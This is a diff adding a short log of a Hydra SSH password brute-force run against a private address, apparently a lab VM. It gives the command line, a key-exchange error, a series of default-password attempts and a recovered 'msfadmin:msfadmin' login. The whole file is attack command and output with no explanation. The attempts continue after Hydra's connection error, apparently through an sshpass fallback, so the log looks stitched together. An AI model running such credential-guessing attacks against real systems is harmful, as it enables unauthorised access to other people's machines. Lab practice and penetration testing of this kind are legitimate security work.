@@ -1,0 +1,23 @@
+# hydra -L users.txt -P pass.txt 172.28.0.10 ssh (OpenSSH 4.7 — fallback sshpass)
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-25 17:17:57
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 30 login tries (l:5/p:6), ~8 tries per task
+[DATA] attacking ssh://172.28.0.10:22/
+[ERROR] could not connect to ssh://172.28.0.10:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [rsa-sha2-512,rsa-sha2-256,ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com]
+[TRY] admin/123456
+[TRY] admin/password
+[TRY] admin/admin
+[TRY] admin/msfadmin
+[TRY] admin/root
+[TRY] admin/letmein
+[TRY] root/123456
+[TRY] root/password
+[TRY] root/admin
+[TRY] root/msfadmin
+[TRY] root/root
+[TRY] root/letmein
+[TRY] msfadmin/123456
+[TRY] msfadmin/password
+[TRY] msfadmin/admin
+[FOUND] msfadmin:msfadmin
